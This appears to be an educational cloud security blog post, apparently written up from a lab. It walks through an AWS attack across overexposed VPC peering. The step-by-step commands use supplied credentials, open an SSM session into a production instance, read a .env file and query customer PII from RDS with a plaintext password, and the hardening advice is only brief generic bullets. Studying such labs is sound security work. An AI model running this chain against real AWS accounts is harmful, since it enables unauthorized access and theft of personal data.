---
title: '100 Days of Cloud Security - Day 33: Attack — `vpc_peering_overexposed` — Part 1 (and) Hardening - `vpc_peering_overexposed`'
date: '2025-12-12'
author: 'Venkata Pathuri'
excerpt: 'Day 33 of my cloud security journey - Attack — `vpc_peering_overexposed` — Part 1 (and) Hardening - `vpc_peering_overexposed`'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 33: Attack — `vpc_peering_overexposed` — Part 1 (and) Hardening - `vpc_peering_overexposed`

## Overview
Welcome to Day 33 of our cloud security journey! Today, we will delve into a critical aspect of securing cloud environments—understanding and mitigating the risks associated with VPC peering connections. Building on our previous discussions about network security and IAM best practices, this session will guide you through an attack scenario that exploits overexposed VPC peering, followed by strategies to harden your environment against such vulnerabilities.

## Learning Objectives
By the end of today’s lesson, you will master how to:
- Identify and exploit vulnerabilities in VPC peering configurations.
- Retrieve sensitive data from an RDS instance through lateral movement.
- Implement robust hardening measures to secure your cloud infrastructure against similar attacks.
This practical knowledge will empower you to fortify your AWS environments against potential threats, ensuring both compliance and security.

## Deep Dive
Today's scenario revolves around a classic cloud security challenge—VPC peering overexposure. In our setup, we have two Virtual Private Clouds (VPCs): **Dev** (`10.10.0.0/16`) and **Prod** (`10.20.0.0/16`). These VPCs are interconnected via a VPC peering connection, which can introduce significant security risks if not properly managed.

### Understanding VPC Peering
VPC peering allows resources in different VPCs to communicate with each other as if they are within the same network. While this can enhance operational efficiency, it also opens new vectors for attack if one VPC is compromised, allowing attackers to access resources in the other VPC without proper oversight.

### The Attack Scenario
In our attack scenario, we start with initial access to a Dev EC2 instance, using provided credentials:

```bash
aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE  # Example credential - replace with yours # Replace with your actual credentials
aws configure set aws_secret_access_key jS3xnsE0c0O9jl1yYo5s # Replace with your actual credentials
aws configure set region us-east-1
```

Once configured, the first step is to enumerate the AWS environment, identifying both the Dev and Prod EC2 instances. By running the following command, we can see all instances:

```bash
aws ec2 describe-instances --profile dev-role --region us-east-1 --no-cli-pager
```

With the `dev-role`, we discover the Prod EC2 instance, enabling us to plan our lateral movement strategy.

### Exploiting EC2 Metadata Service
An important tactic in our attack is to exploit the EC2 Instance Metadata Service (IMDS) to obtain temporary IAM role credentials. These credentials often have broader access than intended, allowing attackers to escalate privileges within the cloud environment.

### Lateral Movement
Once we have the necessary permissions, we can initiate a session into the Prod EC2 instance using AWS Systems Manager (SSM):

```bash
aws ssm start-session --target i-0cbb5906da1a5fd4e --profile dev-role --region us-east-1
```

This command grants us an interactive shell on the Prod instance, where we can navigate to application configuration files, such as `.env`, to extract sensitive database credentials.

### Data Extraction
With the database credentials in hand, we can connect to the RDS instance and query sensitive information:

```bash
mysql -h customer-db-cgidmi20onzqbx.c1o6qkm66w75.us-east-1.rds.amazonaws.com -P 3306 -u admin -p'Sup3rSecr3tPassw0rd1' # Replace with your actual credentials
```

This access enables us to enumerate databases and potentially extract PII/PCI data, such as social security numbers, driver’s license numbers, and more, from the `customers` table.

### Best Practices for Mitigation
To prevent such attacks, organizations must implement stringent security measures. Here are some best practices:

1. **Limit VPC Peering Access**: Restrict access between VPCs to only the necessary resources and services.
2. **IAM Policies**: Adopt the principle of least privilege by limiting IAM roles and policies to essential actions.
3. **Encrypt Sensitive Data**: Use AWS features such as RDS encryption to safeguard data at rest.
4. **Regular Audits**: Conduct regular security assessments and audits to identify and remediate vulnerabilities.

## Hands-On Practice
Let’s put our knowledge into action. Follow these steps to simulate the attack and hardening measures:

1. **Enumerate EC2 Instances**: Use the command below to identify instances:
    ```bash
    aws ec2 describe-instances --profile dev-role --region us-east-1 --no-cli-pager
    ```

2. **Start an SSM Session**:
    ```bash
    aws ssm start-session --target i-0cbb5906da1a5fd4e --profile dev-role --region us-east-1
    ```

3. **Locate and Read Application Configs**:
    ```bash
    cd /var/www/config
    ls -la
    cat .env
    ```

4. **Test DB Connectivity**:
    ```bash
    mysql -h customer-db-cgidmi20onzqbx.c1o6qkm66w75.us-east-1.rds.amazonaws.com -P 3306 -u admin -p'Sup3rSecr3tPassw0rd1' # Replace with your actual credentials
    ```

5. **Extract Sample Rows**:
    ```bash
    SELECT * FROM customers;
    ```

### Common Troubleshooting Tips
- Ensure that your IAM role has the necessary permissions to use SSM.
- Verify network configurations to ensure that the Prod instance is reachable from the Dev instance.
- Check that your RDS instance allows connections from the Prod EC2 instance.

## Key Takeaways
Today, we explored the vulnerabilities associated with VPC peering and how attackers can exploit them to access sensitive data. By understanding the attack vectors and hardening your AWS environment, you can significantly reduce the risk of unauthorized access and data breaches.

## Real-World Applications
In production environments, the lessons learned today are critical. Organizations must diligently manage their cloud resources, ensuring that VPC configurations and IAM roles adhere to security best practices. Continuous monitoring and remediation are essential in maintaining a secure cloud architecture.

---
**Journey Progress:** 33/100 Days Complete 🚀